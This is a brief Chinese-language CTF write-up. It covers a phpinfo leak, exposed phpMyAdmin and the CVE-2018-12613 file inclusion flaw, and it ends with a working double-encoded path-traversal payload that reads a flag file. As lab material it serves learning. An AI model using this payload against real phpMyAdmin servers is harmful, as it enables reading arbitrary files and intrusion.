# 知识点：

# 1.phpinfo泄露

# 2. phpmyadmin任意访问

# 3. phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞



1.一开始提示有一个数据库，叫我们寻找

尝试 /phpMyAdmin没有发现，实在坑



2. 扫描后台发现存在robots.txt

然后发现存在phpinfo.php页面



3.后面发现数据库为phpmyadmin全部小写



4. phpmyadminCVE-2018-12613存在任意文件包含漏洞



5. payload:

```javascript
/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag
```

